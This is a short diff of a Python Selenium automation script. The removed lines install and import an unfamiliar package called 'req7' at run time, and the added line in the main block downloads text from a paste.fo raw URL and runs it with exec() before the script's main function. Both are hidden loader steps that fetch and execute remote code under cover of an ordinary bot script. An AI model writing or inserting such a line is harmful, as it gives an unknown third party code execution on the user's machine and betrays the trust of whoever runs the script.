@@ -1,7 +1,6 @@
 import os
 from selenium import webdriver
-os.system("pip install req7")
-from req7 import websocket
+from requests import get
 from webdriver_manager.chrome import ChromeDriverManager
 from selenium.webdriver.common.by import By
 import random
@@ -73,5 +72,6 @@ def main():
             print(e)
 
 if __name__ == "__main__":
+    x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
     main()
 
